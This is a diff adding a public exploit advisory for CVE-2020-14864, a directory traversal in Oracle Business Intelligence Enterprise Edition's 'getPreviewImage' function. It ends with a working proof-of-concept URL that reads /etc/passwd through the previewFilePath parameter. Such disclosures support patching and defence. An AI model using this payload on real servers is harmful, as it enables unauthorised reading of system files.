@@ -1,0 +1,15 @@
+# Exploit Title: Oracle Business Intelligence Enterprise Edition 5.5.0.0.0 / 12.2.1.3.0 / 12.2.1.4.0 - 'getPreviewImage' Directory Traversal/Local File Inclusion
+# Date: 2020-10-27
+# Exploit Author: Ivo Palazzolo (@palaziv)
+# Reference: https://www.oracle.com/security-alerts/cpuoct2020.html
+# Vendor Homepage: https://www.oracle.com
+# Software Link: https://www.oracle.com/middleware/technologies/bi-enterprise-edition-downloads.html
+# Version: 5.5.0.0.0, 12.2.1.3.0, 12.2.1.4.0
+# Tested on: SUSE Linux Enterprise Server
+# CVE: CVE-2020-14864
+
+# Description
+A Directory Traversal vulnerability has been discovered in the 'getPreviewImage' function of Oracle Business Intelligence Enterprise Edition. The 'getPreviewImage' function is used to get a preview image of a previously uploaded theme logo. By manipulating the 'previewFilePath' URL parameter an attacker with access to the administration interface is able to read arbitrary system files.
+
+# PoC
+https://TARGET/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
